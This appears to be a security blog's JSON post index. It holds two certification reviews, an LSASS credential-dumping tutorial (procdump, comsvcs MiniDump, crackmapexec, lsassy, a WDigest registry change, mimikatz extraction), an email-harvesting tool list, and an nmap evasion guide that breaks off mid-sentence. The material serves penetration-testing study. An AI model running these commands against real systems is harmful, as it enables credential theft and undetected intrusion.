[ { "title": "HTB Certified Active Directory Pentesting Expert (CAPE) - How to Pass", "url": "/posts/htb-certified-active-directory-pentesting-expert-cape-review/", "categories": "certification, cape", "tags": "cape, htb, active directory, red team, pentesting, certification", "date": "2025-08-23 12:00:00 +0300", "snippet": "Those of you who read my “Certified Red Team Professional (CRTP) - How to Pass” article will remember that at the end of it, I set myself a new goal and said, “the next fortress to conquer will be the HTB Certified Active Directory Pentesting Expert (CAPE).” That day has come, and I’m here to happily announce that I have conquered that fortress!In this article, I will dive deep into this challenging yet incredibly instructive exam that truly lives up to its name, sharing my preparation process and what awaits you in the exam with all my sincerity.CAPE pulls you into the deepest parts of the ocean. The “just run the tool and get the result” mentality simply doesn’t work here. You need to understand the soul of Active Directory, know what every object and every permission means, and figure out the complex relationships they form with each other.Let me warn you from the start: This exam requires far more detailed knowledge, much more patience, and a much sharper “attacker” mindset compared to other Active Directory exams on the market. The exam environment simulates a real-world domain environment so well that you can sometimes spend hours on a single machine, only to realize you’re not making progress because you overlooked a tiny detail.That’s why in this guide, in addition to technical details, I will be giving plenty of advice like, “pay attention to this,” “don’t fall for this mistake,” and “adopt this way of thinking.”For Those in a Hurry: TL;DR Who is it for?: A perfect fit for those with intermediate-to-advanced experience in Active Directory penetration testing who want to specialize in the Red Team field. The Lab: An incredible learning environment, filled with real-world scenarios that are brain-melting but just as developmental. Format: Proctor-free. You have a total of 10 days for both the exam and reporting. Environment: You are expected to compromise a fully-patched Active Directory forest with multiple domains. Report: You must submit a professional penetration testing report in PDF format (max 20MB) within the 10-day period.What’s Inside the Course?HTB’s CAPE course is a highly comprehensive training that takes you into the darkest corners of a modern Active Directory environment. It adds layers of new and complex information on top of your Active Directory fundamentals. The training materials consist entirely of modules with explanations and illustrated demonstrations. After each concept is detailed, there is a lab environment at the end of the page for you to reinforce that topic. You progress by running the lab and applying what you’ve learned.Here’s what’s on the menu: Advanced Active Directory Enumeration Advanced Active Directory Attacks Abusing AD Protocols Abusing AD Trusts Abusing AD Misconfigurations Abusing Common Active Directory Components Command and Control (C2) Operations Windows Antivirus Evasion Techniques Pivoting &amp; Lateral Movement Advanced Post-exploitation TacticsIn short, each module is an ocean in itself. So it’s not really possible to just “read it and move on.” It’s essential to understand and digest every concept and to try it out multiple times in the module’s lab environment.The Exam Environment &amp; What to ExpectThe exam makes you experience a real penetration testing project from A to Z. The process begins with a request email sent to you, in which you are asked to prepare a full-fledged penetration test report. The domain and network structures in the environment (like IP addresses, domain names, and which domain is on which subnet) are given to you at the beginning.Access is a two-step process: First, you establish a VPN connection to the Active Directory environment with the information provided. Then, the SSH information for a Parrot OS machine, which HTB has prepared for you and has access to the environment, is shared.The exam will officially start as soon as you connect to this Parrot machine via SSH after VPN and you will be able to start numbering.So, what awaits you in this environment? The Goal: To capture a total of 10 flags by compromising and pivoting between computers in the specified domains. Creativity and Methodology: The exam requires creative thinking much more than rote steps. When you feel you’re stuck, don’t panic. Don’t hesitate to use the course content as a checklist to verify, “Have I tried this technique?” Enumeration Diversity: Don’t blindly rely on a single enumeration tool. Sometimes one tool can see what another misses. Be sure to try alternative tools, and if necessary, be prepared to perform manual enumeration with the information you have. Rabbit Holes: In my experience, there are no obvious “rabbit holes” that will keep you busy for hours. If you can’t make progress down a certain path, you have likely overlooked a detail or not tried a different approach.Before Conquering the Fortress: A CAPE Prep GuidePreparing for this exam requires a much more disciplined process compared to other Active Directory exams. Devour the Course Materials: Make sure you understand every module, every line. Don’t skip a concept thinking, “this probably won’t be on the exam,” because it absolutely will be. Exploit the Lab: Complete all the lab machines in the course not just by watching walkthroughs, but by trying to solve them yourself. Even after solving them, try resetting and solving them again using different paths. Constantly ask yourself, “Why did this attack work?” and “How else could I have done this?” Especially, learn alternative enumeration techniques for that vulnerability, if any exist. Mindset Shift: Instead of blindly trusting the output of tools, focus on understanding what that output means behind the scenes. You should be able to say, “BloodHound showed this path because user A has permission C on machine B, which leads to vulnerability D,” rather than just “BloodHound showed me the way.” Mastering tools like PowerView and dacledit and being able to manually interpret their output is crucial.The 10-Day Marathon: Exam Day StrategiesA Confession: My Personal Note on Time and Stress ManagementBefore we get into this section, I want to share a personal experience with you in all sincerity: I did not pass the CAPE exam on my first attempt. I succeeded on my second try, three months later. The reason for my initial failure was not a lack of technical knowledge, but a complete inability to manage time and stress.The 10-day period, while seeming comfortable on one hand, can create immense pressure as each day melts away. On my first attempt, I panicked when I hit a wall and started acting hastily instead of thinking methodically. This led to more mistakes and wasted time. At the end of the exam, I realized that CAPE tests not only your technical skills but also your mental resilience under pressure.So, my most important piece of advice is this: Stay calm and trust yourself. When you get stuck, accept it as part of the process. See this exam as a 10-day marathon and spread your energy across all the days.The 10-day window might sound long, but it flies by in the blink of an eye. Here are some golden strategies to use your time effectively: Time Management: Make a plan for yourself. Dedicate the first few days solely to getting to know the environment and performing deep enumeration. Spread your energy throughout the days; don’t burn out on day one. The Art of Note-Taking: Taking notes is everything in this exam. Don’t just jot down the passwords you find or the commands you run; document your thought process. Notes like, “I’m trying X now because I found Y. My goal is to reach Z,” will be incredibly helpful when you’re stuck and need to retrace your steps. Tools like Obsidian or CherryTree are great for this. The Golden Rule: Write the Report as You Go: This is perhaps the most critical piece of advice. Start writing your report the moment the exam begins. Report writing will take much longer than you think, and if you leave it until the end, you’ll likely run out of time. The reporting process is also a consolidation session; as you document your steps, you might notice a detail you missed or come up with a new attack idea. Before starting the exam, be sure to download and review the sample CAPE report template provided by HTB. Knowing what’s expected of you from the very beginning will give you a huge advantage. The report basically expects two main sections: First, a step-by-step walkthrough of how you obtained the flags. Second, a list and explanation of all the vulnerabilities you found in the environment during the process (I reported around 40 findings in my exam). Enumeration, Enumeration, Enumeration: I’m not sure if I’ve emphasized this enough, so here it is again: CONSTANT ENUMERATION! Found a new credential? Rescan the entire domain from that user’s perspective. Got access to a new machine? Scrutinize everything on it. Take Breaks: Are you stuck on a path? Staring at the same screen for hours is pointless. Get up, have a coffee, go outside for some fresh air. When you return, you’ll often find you notice the detail you were missing. Approach BloodHound Wisely: BloodHound is your best friend, but it can sometimes be misleading. If the data you’ve collected is outdated or incomplete, it can send you down the wrong path. Make sure you keep it updated with new information and always manually verify its findings instead of blindly trusting them. Be Prepared for AV Evasion: During the exam, you may need to use code or binaries that could be flagged as malicious to execute certain techniques. At this point, you are expected to bypass security mechanisms like Windows Defender or AMSI (Antimalware Scan Interface). If you are sure your code is correct and your technique is sound, but you’re not getting the expected result (like a shell), the antivirus is likely blocking you. Don’t panic. Try again and again to bypass the block by applying various obfuscation techniques to your payload. Have Your Cheatsheet Ready: Absolutely prepare a cheatsheet with the commands you’ll use frequently. For example, since I had to restart the environment several times, having command sets for routing, enabling RDP, adding a new local admin user, and disabling Defender saved me a tremendous amount of time. You should think about every detail that could save you time beforehand. When you restart the environment, this cheatsheet will help you get back to where you were much faster, preventing you from losing focus.Reporting: Turning Technical Skill into an ArtYou’ve showcased your technical skills, you’ve collected the flags… But the part that will truly earn you the medal is the reporting. Remember, this is a certification, and a professional report is expected of you. Time and Format: You must submit your report within the 10-day period after starting the exam. The report should be prepared using the provided template, in English, in PDF format, and should not exceed 20MB. It’s Mandatory: Even if you fail the exam, submitting a report is mandatory to be eligible for a second attempt. If you don’t submit a report, you forfeit your right to a retry. Details Matter: For each finding, you must include what the vulnerability is, how it was exploited (with commands and screenshots), its business impact, and most importantly, detailed recommendations on how to fix it. Present Your Evidence Professionally: The evidence you include in your report (screenshots and console outputs) is crucial. Make sure you save the console output for every attack step. When presenting this evidence, always mask sensitive data like passwords or hashes. Also, improve your report’s readability by snipping long console outputs with tags like &lt;SNIP&gt; to show only the relevant parts. This professional approach plays a huge role in how your report is evaluated. Your Notes Will Save You: The detailed notes you take during the exam will turn the report-writing process from a chore into an enjoyable task. If your notes are good, writing the report will be as simple as organizing and putting them together.In Summary: The Golden Rules for SuccessAfter all these experiences, I can summarize the path to success in the exam with these points: Stay Calm and Be Methodical: This is a 10-day marathon, not a sprint. Manage your stress, spread your energy across the days, and proceed methodically. Remember, this exam also measures your mental resilience. Don’t Leave the Report for Last: Start writing the report the moment you start the exam. This saves time and helps you organize your thoughts. Don’t forget to review the sample template beforehand. Learn the Logic, Not Just the Course: Don’t just complete the modules; understand “why” each technique works. Don’t blindly trust tools; interpret the outputs yourself. Explore Endlessly (Enumeration): Every new piece of information can open a new door. Use different tools, and check manually if necessary. Your biggest key will be continuous and detailed enumeration. Take Notes, Save Your Life: Note down not just the commands, but “why” you’re running that command. Your notes will be your best guide when you get stuck. Have Your Cheatsheet Ready: Keep commands for repetitive tasks (like enabling RDP, adding a user, etc.) or for when you restart the environment in a ready file. This will save you an incredible amount of time. See Antivirus as Your Adversary: If you don’t get a shell or your code doesn’t work, your first suspect should be AV/AMSI. Be prepared to obfuscate your payloads. Present Your Report Professionally: Never leave sensitive data like passwords/hashes exposed in your evidence (console outputs, screenshots). Mask them and snip long outputs with &lt;SNIP&gt;.The Fortress Has Fallen, So What’s Next?In my previous article, I set HTB CAPE as my goal after CRTP. I am thrilled to have reached this goal. I feel that the CAPE certification, combined with my existing work experience and other certifications, has brought my penetration testing skills to a certain level of maturity.Now, I’m setting my course for deeper waters: Red Team operations. In the coming period, I will focus on new certifications and training to fill in my missing techniques in this area. I aim to take my skills to the highest level by focusing on advanced topics that are the cornerstones of Red Team operations, such as OPSEC (Operational Security), the setup and management of C2 (Command and Control) infrastructures, and malware development.I hope my experiences shed some light for everyone preparing for or thinking about taking on the challenging journey of the HTB CAPE exam. Remember, this process is as rewarding and educational as it is difficult. Thanks for reading, and if you have any questions, don’t hesitate to reach out to me through the channels on my contact page!" }, { "title": "Certified Red Team Professional (CRTP) - How to Pass", "url": "/posts/certified-red-team-professional-CRTP-review/", "categories": "certification, crtp", "tags": "crtp, crtp exam, crtp review, crtp 2025, cyber security, cyber secyrity certification", "date": "2025-03-27 00:00:00 +0300", "snippet": "Certified Red Team Professional (CRTP) - How to PassI won’t go into detail about what CRTP is or who it’s suitable for. If you’re aiming for this certification, you already know the basics. If you want to get to the most critical information quickly, the TL;DR section below is for you!TL;DR Who is it suitable for: A great introductory certification for those looking to step into the Red Team area. LAB: Quite educational and enjoyable. Exam Format: You have 24+1 hours without a proctor. Access to the lab environment is provided via VPN or Guacamole. Exam environment: 5 target servers need to be compromised. Report: It must be submitted within 48 hours after the exam.Course OverviewThe course content includes a training series consisting of approximately 47 videos. It starts with the basic concepts of topics such as Active Directory, PowerShell, Offensive .NET, and then explains the lab environment in detail. The course explains the AMSI bypass and AV Signature bypass methods at the entry level. Then, starting with domain enumeration, it shows how to first detect and then exploit the entry and mid-level vulnerabilities that can be exploited in the Active Directory environment.There is a lab environment where you can practice for each topic. You can check whether the flags you obtain in the Flag verification field by entering them. In addition, walkthrough videos and guides have been prepared. The trainings are clear, understandable and directly focused on the subject.Exam Structure &amp; What to ExpectThe CRTP exam provides a practical environment that allows you to experience a real Red Team scenario. After accessing via VPN or Guacamole, it drops you directly into the assumed breach scenario. At the beginning, you have access to a specific server and from there you are expected to explore other systems in the network, identify and exploit vulnerabilities. There are five target servers in front of you and taking them all is critical to successfully completing the exam!One of the biggest advantages of the exam is that it is based entirely on the techniques explained in the course content. You do not have to deal with unknown, overly complex or out-of-course vulnerabilities. This means that if you have understood the techniques explained in the lab environment, there will be no big surprises waiting for you in the exam. However, this does not mean that the exam is easy! The right strategy, careful analysis and solid time management are essential.Before starting the exam, it takes about 10-15 minutes of setup time to prepare the environment. Therefore, the total exam duration is determined as 25 hours. After completing each stage meticulously, the final stage begins: reporting! Once the exam is complete, you have 48 hours to document your findings in detail. Remember, as much as technical skills, reporting your findings clearly and concisely is key to your success!Preparation Guide: How to Get Ready for CRTP?The most critical point when preparing for the CRTP exam is to fully digest the course materials and practice a lot. First of all, watch the training videos carefully and make sure you complete all the tasks in the lab environment. Practice is as important as theory, because the exam is based on a completely practical scenario.For me, the practical part was a bit more advantageous because I had previously performed penetration tests in Active Directory environments. Having tested many of the vulnerabilities I encountered while receiving the training in the past accelerated the process. However, this should not be intimidating for those who will be working with AD for the first time! The course content systematically covers all basic and intermediate attack techniques.I purchased 30-day course and lab access during my own preparation process. After completing the videos and establishing the theoretical basis in the first few days, I solved all the tasks in the lab environment and put what I learned into practice. If you have not had the opportunity to sufficiently apply the techniques explained in the course content, I strongly recommend that you set up your own AD lab environment and practice enumeration and exploitation.You won’t need any of the techniques from outside the course on the exam, but skimming through the course content would be a big mistake. Make sure you practice and reinforce each technique for success!Exam Day: Strategies for SuccessMy exam day was anything but ordinary. I had had a nose job and spent two days in the hospital. When I got home, I was still recovering, but I also took advantage of being on sick leave—I could focus entirely on the exam! After a relaxed breakfast and a chat with my colleagues, I started the exam around 6:00 PM. Some strategies I followed during this process made my job much easier: Taking notes: I kept all my notes on Notion. Saving information regularly provides a great advantage in the later stages. Command outputs: I saved the output of every command I ran, both in plain text and as screenshots. It was incredibly useful for going back and checking. Taking a break: I took a break when I got stuck. When you get stuck, it can be good to go outside, get some air, or have a snack. BloodHound usage: Definitely use BloodHound! It allowed me to solve two target servers directly. When I was writing the report, I realized that it actually shows three targets directly, but I missed one. If you use it correctly, it can completely change the course of the exam!ReportingThe 48-hour period is really enough to prepare the report. A big advantage for me was the notes I kept in Notion throughout the exam. Thanks to these notes, I completed the report completely and in an organized manner. The report should not only describe the techniques you exploited, but also include mitigation suggestions on how to fix each vulnerability.Here are some important points to consider when preparing the report: Mitigation recommendations: It is very important to include recommendations on how to take action for each vulnerability. Console outputs and screenshots: Screenshots and command outputs showing each step in detail enrich your report. Explanations: You should explain each step clearly. When you go step by step, it is easier for the reader to follow. Tools and resources: Referencing the tools, technical documentation, and resources you used makes your report more professional.After the exam, I submitted my report according to the email instructions sent by Altered Security. I prepared a comprehensive report of approximately 60 pages and documented the process in every detail, making sure the report was accurate.After the Exam: What’s Next?My next goal after the exam is HTB CAPE. I want to move forward with the Offsec mentality to focus on Active Directory structures. I will deepen the knowledge I gained with this certificate by targeting Active Directory vulnerabilities with an exam like CAPE. My goal is to further develop my knowledge and skills in this area and discover more complex vulnerabilities!Thanks for reading. I hope it will be useful for those who will take the exam. If you have any questions or want to ask anything, you can reach me through the links on the contact page." }, { "title": "Dumping LSASS Without Mimikatz", "url": "/posts/dumping-lsass-without-mimikatz/", "categories": "", "tags": "red-team, lsass, mimikatz, procdump, Comsvcs, crackmapexec, LSASSY, wdigest", "date": "2022-12-08 00:00:00 +0300", "snippet": "Mimikatz is a tool for dumping credentials from memory in Windows. It is a great tool for lateral and vertical privilege escalation in Windows Active Directory environments. Due to its popularity, the Mimikatz executable and PowerShell script are detected by most of the Antivirus (AV) solutions out there. In this article, I will talk about using several alternative methods to achieve the same goal without the need to modify the Mimikatz.What is LSASS?The Local Security Authority Subsystem Service (LSASS) is the service in Microsoft Windows that manages all user authentication, password changes, generation of access tokens, and enforcement of security policies. For example, when you log on to a Windows user account or server, lsass.exe verifies the login name and password.Requirements to Get DUMP from LSASSIt is necessary to have SeDebugPrivilege privilege to dump LSASS as an attacker. The default Windows setting is to give this privilege to local administrators. You can check the rights with the command below.whoami /privLSASS Dump Getting MethodsMethod 1- Getting LSASS Dump with Task Manager (GUI)If you have Remote Desktop Protocol (RDP) session or other GUI access to the device, you can use the Windows Task Manager to create a dump file. By default, Windows Defender does not warn about threats.From the Task Manager go to the Details tab, find lsass.exe, right click and select Create dump file.This will create a dump file in the user’s C:\\Users\\0xhav0c\\AppData\\Local\\Temp directory:Method 2- Getting LSASS Dump with ProcDumpProcdump is a Windows SysInternals tool that can be used to create memory dumps of processes. The disadvantage of this method is that you have to copy the Procdump executable to the target machine, and some organizations warn the binary as malicious.To create a LSASS memory dump:PS C:\\Users\\0xhav0c&gt; procdump.exe -accepteula -ma lsass.exe out.dmpDownloading ProcDump on victim machine with evil-winrm sessionSimple web server on attacker machine for share procdump filesGetting LSASS Dump with ProcDump.exeSome EDR solutions warn or block this based on the lsass process name. This can usually be bypassed by specifying the LSASS transaction ID instead.To get the LSASS process ID via PowerShell:PS C:\\Users\\0xhav0c&gt; get-process lsassFinding lsass.exe PID with PowershellTo get the LSASS process ID with CMD:C:\\Users\\0xhav0c&gt; tasklist | findstr lsassfinding lsass.exe PID with CMDThen dump the findstr value with the same procdump:C:\\Users\\0xhav0c&gt; procdump.exe -accepteula -ma 528 out.dmpAdditionally, depending on the EDR, you can simply add quotes around the transaction namePS C:\\Users\\0xhav0c&gt; procdump.exe -accepteula -ma “lsass.exe” out.dmp#orPS C:\\Users\\0xhav0c&gt; procdump.exe -accepteula -ma 'lsass.exe' out.dmpMethod 3- Getting LSASS Dump with ComsvcsWith Comsvcs you can create a memory dump using native libraries available on Windows machines.# Detect the PID for lsass.exePS C:\\Users\\0xhav0c&gt; tasklist | findstr lsasslsass.exe 524 Services 0 51,752 K# Dumping LSASS.exePS C:\\Users\\0xhav0c&gt; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 524 C:\\temp\\out.dmp fullFinding lsass.exe pid and getting LSASS dump with Comsvcs.Method 4- Getting LSASS Dump with CrackmapexecCrackmapexec is an excellent tool for performing a LSASS dump remotely. With credentials with local admin access, you can to indicate an entire subnet or list of IP addresses and get.crackmapexec smb 192.168.x.x -u 0xhav0c -p Password123! --lsaGetting LSASS dump with Crackmapexec.Stored hashes and plaintext password outputs. If Crackmapexec catches hashes and plaintext passwords, it will keep it in its home directory under ~/.cme/logs/.CrackMapExec uses Impacket’s secretsdump.py to dump LSASS.Method 5- Getting LSASS Dump with lsassyLsassy is a tool that uses a combination of the above methods to offload LSASS remotely. The default command attempts to use the comsvcs.dll method to offload LSASS with WMI or a remote scheduled task:└─$ lsassy -d secybr.com -u 0xhav0c -p Password123! 192.168.x.xGetting LSASS dump with lsassyLsassy is also available in crackmapexec.└─$ crackmapexec smb 192.168.x.x -u 0xhav0c -p Password123! -M lsassyGetting LSASS dump with Crackmapexec lsassy module.The methods shown up to this section were for devices that hold hashes and plaintext credentials.Enabling Wdigest and Obtaining Plain Text CredentialsWDigest is disabled on newer machines. It is possible for attackers to enable this plaintext credentials when a user logs in. WDigest can be enabled by setting the required registry key to “1” instead of “0”:C:\\Users\\0xhav0c&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /d 1Enabling Wdigest with entering a registry key.On victim machine: Attached registry image.Additionally, this can be done remotely with Crackmapexec:└─$ crackmapexec smb 192.168.x.x -u 0xhav0c -p 'Password123!' -M wdigest -o action=enableSMB 192.168.x.x 445 DC [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:secybr.com) (signing:True) (SMBv1:True)SMB 192.168.x.x 445 DC [+] secybr.com\\0xhav0c:Password123! (Pwn3d!)WDIGEST 192.168.x.x 445 DC [+] UseLogonCredential registry key created successfullyMoving Dump Files to Attacker DeviceOnce you have the dump file, you can transfer it to the device where you can use mimikatz in many ways. You can copy paste with RDP. You can mount your disk to that device before sending the RDP connection. You can create a simple PHP page, configure it to accept file uploads to this address, and transfer the file to yourself with a POST request with Powershell on the victim device. If the victim has python on the device, you can create a simple web page by using the http-server module. Or you can upload it to an upload site that comes to mind first and get it from there.Examining Dump FilesMethod 1 - Examining Dump Files Using pypkatz└─$ pypykatz lsa minidump lsass.DMPExamining dump files using pypkatz (Since the output is long, it is shared to the terminal.)Method 2 - Examining Dump Files using mimikatz.exeAfter obtaining the dump file, download Mimikaz on a windows device that belongs to you. Make sure to create an exception folder for Windows Defender on the machine where you are using Mimikatz, otherwise Defender Mimikatz will quarantine your executable. Run Mimikatz.Use the following commands to extract the credentials from your LSASS Dump file:sekurlsa::minidump lsass.DMPsekurlsa::logonPasswordsExamining dump files with mimikatz.exe" }, { "title": "Collecting Target Email Addresses", "url": "/posts/collecting-target-email-address/", "categories": "red team, reconing", "tags": "collecting target email address, collecting company email address, verification mail address, collecting victim email address, red-team", "date": "2022-12-07 00:00:00 +0300", "snippet": "app.snov.io Collecting email address from company name Free &amp; Premium Features.Creating Mail Address List From Name and Surnamemetricsparrow.com Creating email address from Name &amp; Surname (Like bruteforce with wordlist)Verification Mail AddressVerification with this python script : github.com/0xhav0c/valid-email-scannerYou can use the following online applications to determine the valid ones from the found email addresses.listcleaningadvice.com Email verifier application listclient.myemailverifier.com Email verifierquickemailverification.com Email verifierapp.emailable.com Email verifier" }, { "title": "Evasion Tactics For Scanning Targets (Active Scan)", "url": "/posts/evasion-tactics-for-scanning-targets/", "categories": "red team, reconing", "tags": "evasion tactics, evasion technique, active scan evasion tactics, port scan evasion tactics, bypass IDS, bypass IPS, bypass firewall, bypass waf, red-team", "date": "2022-12-06 00:00:00 +0300", "snippet": "IDS / IPS Firewall Detection Techniques Sending Bad Checksums TCP ACK Scan (-sA)Sending Bad Checksumsnmap --badsum &lt;target IP&gt; (–badsum is used to send the packets with bad or bogus TCP/UDP checksums to the intended target to avoid certain firewall rulesets)The scan result shows all ports are filtered, indicating that there is no response or the packets are dropped, and thus it can be inferred that the system is configured.TCP ACK Scan (-sA)It is always good to send ACK packets instead of SYN packets because if there is any active firewall running on the remote computer it cannot generate firewall logs due to ACK packets because firewalls treat ACK packet as SYN’s response. package. TCP ACK scan, requires root privileges on the attacker side and performs very well for stateless firewall and IDS. As a penetration tester, you need to check the response of a firewall; There can be four types of responses: Open port (several ports in case of firewall) Closed port (most ports are closed due to firewall) Filtered (not sure if Nmap port is open) Unfiltered (Nmap can access port but still confused about port open status)So these are some important answers you can get during a penetration test. ACK scanning is slightly different from other scanning techniques because it is not designed to discover open ports, but has the ability to identify filtered and unfiltered responses. Let’s compare the two results of an ACK scan.If you need more details, you can check this guide from here.nmap -sA 192.168.x.xEvasion Techniques Decoys Proxies User Agents MAC Address Spoofing Host Detection Methods (Ping Suppression) Fragmentation Timing Changing Data length Random Scan Using Multiple TechniquesDecoysIt is strictly not an evasion technique, but is used to hide the source of the scan. we still need to send packets from our IP address, but we can spoof other IP addresses during the scan so we can make the scan look like it’s coming from other hosts.In this way, it can make it difficult for the security device to automatically block our IP and determine our IP.nmap -D RND:10 192.168.x.x #(Generates a random number of decoys)nmap -sS --top-ports 10 -D 192.168.xx.xx,192.168.yy.yy,10.10.xx.xx 8.8.8.8 #(Manually specify the IP addresses of the decoys)# Tip: If your target at the external network, you have to use external IP address. You can use many random different IP address. Just remember to use \",\" between two IP addresses.# For example usagenmap -sS --top-ports 10 -D 2.2.2.2,1.1.1.1 184.50.204.169ProxiesNmap scanning with Torsudo apt-get install tor#Configuration torsudo apt-get install ntpdate #Proxies need exact time settings from your system. Check your timezone, choose the one that is correct for your region.sudo ntpdate -v pool.ntp.org # After it's finished, reboot and you are good to gosudo apt-get install proxychainsProxyChains is already configured to use Tor by default. You can verify this by looking up /etc/proxychains.conf. The last lines should be like these:[ProxyList]# add proxy here ...# meanwile# defaults set to \"tor\"socks4 127.0.0.1 9050 There are two proxychains.conf files in kali linux. For more effective results, after backing up the proxychains.conf file, update the proxychains4.conf file as proxychains.conf.sudo cp /etc/proxychains.conf /etc/proxychains.conf.bcksudo cp /etc/proxychains4.conf /etc/proxychains.confWe are now ready to perform an anonymous Nmap scan over the Tor network.sudo proxychains nmap -Pn -sV -p80 116.62.x.x #If you don't get results the first time, you may have to try a few more times.Nmap Through Tor: Get Round Blocked EndpointsIt is possible that we will encounter a situation where scan fails, because Tor endpoints are blocked.The solution may be in adding common public proxy server to the ‘chain’. We can do that by simply editing the /etc/proxychains.conf and adding a new entry at the end of the [ProxyList] (be sure that random_chain option is disabled).[ProxyList]# add proxy here ...# meanwile# defaults set to \"tor\"socks4 127.0.0.1 9050socks4 121.34.113.5 1080User AgentsBy default  Nmap comes fully bundled with NSE (Nmap Scripting-Engine) a fully integrated scripting engine with many useful libraries.The http library is very commonly used, however many people dont realise they are using the user-agent  Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)This is obviously a value you wouldn’t like to be used when pen-testing, as it would give your presence away on the battlefield, as they say. Additionally, it is easily detected and blocked (Unique to Nmap’s NSE http library). If you are going to use an http script in your nmap scan, for example http enum or full port scan, don’t forget to change the user agent.Furthermore, Mod Security, and many other WAF’s (Web Application Firewalls) etc will quickly catch on to what you’re up to.For example a ModSecurity rule that detects and blocks this default user agent is:SecRule REQUEST_HEADERS:User-Agent \"@streq Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)\" denyWith a good Sec setup on the server using ModSecurity, fail2ban etc would more than likely kick in, dropping your scanner’s connections.According to the NMAP development team this value is left by “design” and that if you want to change it you have to use --script-args http.useragent=\"some ua\" when launching your Nmap scans. There are some packet filtering products that block requests using Nmap’s default HTTP user agent. You can use a different user agent value by setting the argument http.useragent:nmap -p80 --script http-sqli-finder --script-args http.useragent=\"Mozilla 42\" 192.168.x.xTo set the user agent in your NSE script, you can pass the header field, as follows:options = {header={}} options['header']['User-Agent'] = \"Mozilla/9.1 (compatible; Windows NT 5.0 build 1420;)\" local req = http.get(host, port, uri, options)The problem is that this is burdensome to add (and remember)  everytime you need it.NMAP How to change user agentYou can find the default value in /usr/share/nmap/nselib/http.lua (At the beginning of the file, a couple of lines after the comments)local USER_AGENT = stdnse.get_script_args('http.useragent') or \"Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)\"You can change the value with this linelocal USER_AGENT = stdnse.get_script_args('http.useragent') or \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\"You can set it to whatever you like, stealth is key, change it periodically etc.MAC Address SpoofingAnother method for bypassing firewall restrictions while doing a port scan is by spoofing the MAC address of your host.This technique can be very effective especially if there is a MAC filtering rule to allow only traffic from certain MAC addresses so you will need to discover which MAC address you need to set in order to obtain results.Specifically the –spoof-mac option gives you the ability to choose a MAC address from a specific vendor,to choose a random MAC address or to set a specific MAC address of your choice.Another advantage of MAC address spoofing is that you make your scan more stealthier because your real MAC address it will not appear on the firewall log files.nmap -Pn -sV --spoof-mac 0 192.168.x.x #Generate a random MAC address —-&gt; —spoof-mac 0nmap -Pn -sV --spoof-mac Dell 192.168.x.x #Specify MAC address from a Vendor —-&gt; –spoof-mac Dell/Apple/3Comnmap -Pn -sV --spoof-mac 00:0C:29:6F:D9:6A 192.168.x.x #Specify your own MAC address —-&gt; —spoof-mac 00:0C:29:6F:D9:6A (For example NAC, IT Personal MAC Address)Host Detection Methods - Ping SuppressionTypically, security administrators block ICMP (echo request, echo response) ping on the firewall to prevent outside attackers from discovering active hosts.When we Scan with Nmap it sends an ICMP Request to see if the host is available and open. If no response, informs that the host is not working. Using the -Pn switch we can scan our target without sending the default ICMP.nmap -Pn 192.168.x.x #No ping scansudo nmap -sn -PA 192.168.x.x #ACK Ping scansudo nmap -sn -PU 192.168.x.x #UDP Ping scansudo nmap -sn -PS 192.168.x.x #TCP SYN Pingsudo nmap -sn -PR 192.168.x.x #ARP Pingnmap ICMP scan -1nmap ICMP scan -2nmap ICMP scan -3nmap ACK ping scanFragmentationFragment PacketsThis is a very general concept and can be used in many different situations, for example: the fragmentation technique is useful for escaping the firewall if the target machine does not have the capabilities to handle larger packets. The parameter for this technique is -f, it simply splits the request into segments of small IP packets called fragmented IP packets.You can use -f twice -ff if you want to break IP headers further.In this attack, nmap will split the IP header into many small pieces to escape the IDS. The pieces are then reassembled at the destination. Because IDS relies on signatures very similar to AV software, parts will not match the signature IDS is looking for. This, will allow the fragments to traverse the network where they will be reassembled on the target machine and do a port scan.nmap -sT -f 192.168.x.xnmap -sV -ff 192.168.x.x #if you want to break IP headers further.Fragment Packets - NmapCapture a fragment packetSpecify a specific MTUNmap is giving the option to the user to set a specific MTU (Maximum Transmission Unit) to the packet. This is similar to the packet fragmentation technique that we have explained above. During the scan that size of the nmap will create packets with size based on the number that we will give. In this example we gave the number 32 so the nmap will create 32-byte packets causing a confusion to the firewall. Have in mind that the MTU number must be a multiple of 8 (8,16,24,32 etc). You can specify the MTU of your choice with the command –mtu number target.nmap -sV --mtu 32 192.168.x.xSpecify a specific MTU to the packetsTimingThe scheduling option is a very important and interesting feature of an Nmap because sometimes you have to make a delay between each request. There are many reasons for this, but the most important reason is the stress on the network; sometimes the victim’s computer or even a network cannot handle a large request. As a penetration tester, you need to make sure that your scan should not be considered a Denial of Service attack (DoS), so timely response and request are very important considerations in scanning. Nmap has many features and parameters that can be very useful for scanning a target in a timely manner; fragmentation technique as discussed (-f) is also a useful technique for splitting your request into multiple partitions. Other important parameters are discussed below:Delay (–scan_delay)This is the best parameter to use to control the delay between each request. Remember to use the timing in integer format and mention the unit of time as you can control the time between each probe.nmap -Pn -scan-delay 5s -sV 192.168.x.x#ms (milisecond) | #s (second) | #m (minute) | #h (hour)Host Timeout Option (–host-timeout)Sometimes a host takes too much time to respond and if you are scanning an entire network then it is very difficult to wait for a single host. There might be so many reasons behind a slow response, for example the network connectivity and the firewall, so if you don’t want to waste your time then you can set a time limit.nmap --host-timeout 10m 192.168.x.xIdle Zombie ScanThis technique allows you to use another host on the network that is idle in order to perform a port scan to another host.The main advantage of this method is that it very stealthy because the firewall log files will record the IP address of the Zombie and not our IP.However in order to have proper results we must found hosts that are idle on the network.Metasploit framework has a scanner that can help us to discover hosts that are idle on the network and it can be used while implementing this type of scan.msf&gt; use auxiliary/scanner/ip/ipidseqAs we can see from the image above, the scanner has discovered that the IP address 192.168.2.25 is idle on the network and are potential candidates for Idle Zombie Scan. To implement an Idle Zombie scan, what we need is to use the command:nmap -sI 192.168.2.25 192.168.x.x #192.168.2.25 = idle on the network and candidates for Idle Zombie ScanChanging Data lengthMany firewalls are inspecting packets by looking at their size in order to identify a potential port scan. This is because many scanners are sending packets that have specific size. In order 